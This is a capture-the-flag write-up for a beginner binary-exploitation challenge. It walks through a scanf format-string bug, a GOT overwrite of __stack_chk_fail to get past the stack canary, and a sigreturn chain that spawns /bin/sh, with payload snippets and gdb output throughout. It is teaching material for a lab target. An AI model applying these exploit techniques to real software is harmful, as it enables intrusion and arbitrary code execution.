# Beginner's Pwn (42 solves)

Author: moratorium08
Estimated difficulty: Beginner



##

A disassembler (decompiler) like Ghidra/IDA shows that the program is not very large, it reads a string into the buffer buf on the stack using a function called readn that reads bytes at most n bytes, and then scanf (buf), which is apparently dangerous.

The program looks like this:

```
void readn(char *buf, int size) {
    unsigned cnt = 0;
    for (unsigned i = 0; i < size; i++) {
        unsigned long long x = 1;
         asm(
        "movq $1, %%rdx\n"
        "movq %1, %%rsi\n"
        "movq $0, %%rdi\n"
        "movq $0, %%rax\n"
        "syscall\n"
        "movq %%rax, %0\n"
        : "=r"(x)
        : "r"(buf+i)
        : "memory");
        cnt += x;
        if (x != 1 || buf[cnt - 1] == '\n') break;
    }
    if (cnt == 0) exit(-1);
    if (buf[cnt - 1] == '\n') buf[cnt - 1] = '\x00';

}
int main(void) {
    char buf[SIZE];
    readn(buf, SIZE);
    scanf(buf);
    return 0;
}
```

If `buf` is an appropriate format string and place an appropriate pointer on the stack,
you may notice that arbitrary writes and stack overflows are likely to occur.


The result of `checksec` is as follows.
```
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

In this problem, PIE is disabled,
and the area of code and data of the program is statically determined,
and it is partial RELRO, which means GOT overwrite is possible.

There may be many ways to solve this problem,
 but basically you should take the following steps.

- Buffer overflow and GOT overwrite using scanf FSB
- Set rax = 0x3b, rdi = "/ bin/sh \x00", rsi = rdx = 0, and syscall


## Detail of PoC

When analyzing with gdb, readn will modify rsi, so the rsi, the second argument of scanf, points to a pointer on stack.


```
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x401260 (<__libc_csu_init>:	endbr64)
RCX: 0x401191 (<readn+75>:	mov    rax,rax)
RDX: 0x7
RSI: 0x7fffffffe2e7 --> 0x40106000
RDI: 0x7fffffffe2e0 --> 0x73243725207325 ('%s %7$s')
RBP: 0x7fffffffe300 --> 0x0
RSP: 0x7fffffffe2e0 --> 0x73243725207325 ('%s %7$s')
RIP: 0x401237 (<main+52>:	call   0x401040 <__isoc99_scanf@plt>)
R8 : 0x0
R9 : 0x7ffff7fe0d50 (endbr64)
R10: 0x0
R11: 0x206
R12: 0x401060 (<_start>:	endbr64)
R13: 0x7fffffffe3f0 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40122b <main+40>:	lea    rax,[rbp-0x20]
   0x40122f <main+44>:	mov    rdi,rax
   0x401232 <main+47>:	mov    eax,0x0
=> 0x401237 <main+52>:	call   0x401040 <__isoc99_scanf@plt>
   0x40123c <main+57>:	mov    eax,0x0
   0x401241 <main+62>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x401245 <main+66>:	xor    rdx,QWORD PTR fs:0x28
   0x40124e <main+75>:	je     0x401255 <main+82>
Guessed arguments:
arg[0]: 0x7fffffffe2e0 --> 0x73243725207325 ('%s %7$s')
[------------------------------------------------------------------------------]
```

In particular, since this address points to the last place written in buf, an appropriate write to this address causes a stack buffer overflow, and the return address can be overwritten.

The problem is that Canary is also overwritten. If we recall the buffer `buf` on the stack to be written in readn, we can treat it as an argument to scanf if we place a pointer appropriately.
In this case, consider a pointer to the GOT of `stack_check_fail`, and replace this address with just a pointer to `ret`


After all, by the following way, the top of the stack is filled with 0xdeadbeef,
which leads to getting PC.

```
sendline('%s %7$s\x00' + p64(got_stack_check_fail)) # -> for readn
sendline(p64(0xdeadbeef) * 100 + '\n' + p64(ret_addr)) # -> for scanf
```


```
[-------------------------------------code-------------------------------------]
   0x40124e <main+75>:	je     0x401255 <main+82>
   0x401250 <main+77>:	call   0x401030 <__stack_chk_fail@plt>
   0x401255 <main+82>:	leave
=> 0x401256 <main+83>:	ret
   0x401257:	nop    WORD PTR [rax+rax*1+0x0]
   0x401260 <__libc_csu_init>:	endbr64
   0x401264 <__libc_csu_init+4>:	push   r15
   0x401266 <__libc_csu_init+6>:	lea    r15,[rip+0x2ba3]        # 0x403e10
[------------------------------------stack-------------------------------------]
0000| 0x7ffd21b3b258 --> 0xdeadbeef
0008| 0x7ffd21b3b260 --> 0xdeadbeef
0016| 0x7ffd21b3b268 --> 0xdeadbeef
0024| 0x7ffd21b3b270 --> 0xdeadbeef
0032| 0x7ffd21b3b278 --> 0xdeadbeef
0040| 0x7ffd21b3b280 --> 0xdeadbeef
0048| 0x7ffd21b3b288 --> 0xdeadbeef
0056| 0x7ffd21b3b290 --> 0xdeadbeef
[------------------------------------------------------------------------------]
```


Now consider how to execute execve syscall.

In this writeup, we consider the following steps:

- Manipulate rax by using the return value of scanf. Note that scanf returns "How many data were imported"
- By setting registers as desired, we do sigreturn system call.


For scanf("%d %d %d"), if we input "4 5 6", then scanf returns 3.
This allows us to manipulate the value of rax.
By using this technique, we set rax as 15, which is the syscall number of sigreturn.


```
sendline("%1$dA" * 15)
```


Finally, we build a stack for sigreturn as follows.
```
125 frame = [
126         'AAAAAAAA' * 5, # uc_flags - ss_size
127         'AAAAAAAA' * 8, # r8-r15
128         p64(binsh),     # rdi
129         p64(0),         # rsi
130         p64(0) * 2,     # rbp, rbx
131         p64(0),         # rdx
132         p64(59),        # rax
133         p64(0) * 2,     # rcx, rsp
134         p64(syscall),   # rip
135         p64(0),         # eflags
136         p64(0x33),      # csgsfs
137         'AAAAAAAA' * 4,
138         p64(0)          # &fpstate
139         ]
```


Here, we assumed that "/bin/sh\x00" is placed at the BSS area.
We achieve this when we overwrite the GOT address of `stack_check_fail`

To sum up the above, we can get the shell: [solver/solve.py] (solver/solve.py).


